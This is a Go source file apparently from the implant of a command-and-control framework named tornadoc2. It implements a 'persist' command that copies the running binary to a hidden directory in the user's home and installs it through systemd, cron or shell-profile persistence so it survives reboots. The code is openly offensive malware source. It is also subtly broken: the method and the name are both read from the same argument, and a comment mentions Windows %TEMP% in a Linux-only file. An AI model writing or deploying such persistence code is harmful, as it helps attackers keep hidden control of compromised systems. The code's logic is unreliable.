//go:build (persist_systemd || persist_cron || persist_profile) && linux

package core

import (
	"context"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"tornadoc2/agent/protocol"
)

type persister struct {
	name string
	add  func(exe, tag string) (string, error)
	del  func(tag string) error
}

var persisters = map[string]persister{}

func (a *Agent) persistVerb(ctx context.Context, t protocol.Task) Result {
	sub := "list"
	if len(t.Args) > 0 {
		sub = strings.ToLower(t.Args[0])
	}
	if sub == "list" {
		var b strings.Builder
		for k := range persisters {
			b.WriteString(k + "\n")
		}
		return Result{ID: t.ID, Output: encodeOutput([]byte(b.String()))}
	}
	if len(t.Args) < 2 {
		return Result{ID: t.ID,
			Error: "persist add <method> <name> | persist remove <name>"}
	}
	method, tag := strings.ToLower(t.Args[1]), t.Args[1]
	p, ok := persisters[method]
	if !ok {
		return Result{ID: t.ID, Error: "unknown persistence method"}
	}
	exe, err := os.Executable()
	if err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	explicit := ""
	for i := 3; i < len(t.Args); i++ {
		if t.Args[i] == "--path" && i+1 < len(t.Args) {
			explicit = t.Args[i+1]
		}
	}
	if explicit != "" {
		exe = explicit
	}
	switch sub {
	case "add":
		if explicit == "" {
			if exe, err = installCopy(exe, tag); err != nil {
				return Result{ID: t.ID, Error: err.Error()}
			}
		}
		path, err := p.add(exe, tag)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte("installed " + path + "\n"))}
	case "remove":
		if err := p.del(tag); err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		_ = os.Remove(stablePath(tag))
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte("removed " + method + " " + tag + "\n"))}
	}
	return Result{ID: t.ID, Error: "usage: persist list|add|remove"}
}

func stablePath(tag string) string {
	return filepath.Join(profileDir(), ".local", "share", "tornado", tag)
}

// installCopy puts the running binary somewhere durable. An agent
// launched from %TEMP% or a dropped path would otherwise persist a
// path that disappears on cleanup.
func installCopy(src, tag string) (string, error) {
	if err := validTag(tag); err != nil {
		return "", err
	}
	dst := stablePath(tag)
	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return "", err
	}
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC,
		0700)
	if err != nil {
		return "", err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return "", err
	}
	if err := out.Sync(); err != nil {
		out.Close()
		return "", err
	}
	if err := out.Close(); err != nil {
		return "", err
	}
	return dst, nil
}

func validTag(tag string) error {
	if tag == "" || len(tag) > 48 {
		return errors.New("name must be 1-48 chars")
	}
	for _, r := range tag {
		if !(r == '-' || r == '_' || r == ':' ||
			(r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9')) {
			return errors.New("name may use letters, digits, _ - and :")
		}
	}
	return nil
}

func profileDir() string {
	h, _ := os.UserHomeDir()
	return h
}

func runQuiet(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	return cmd.Run()
}
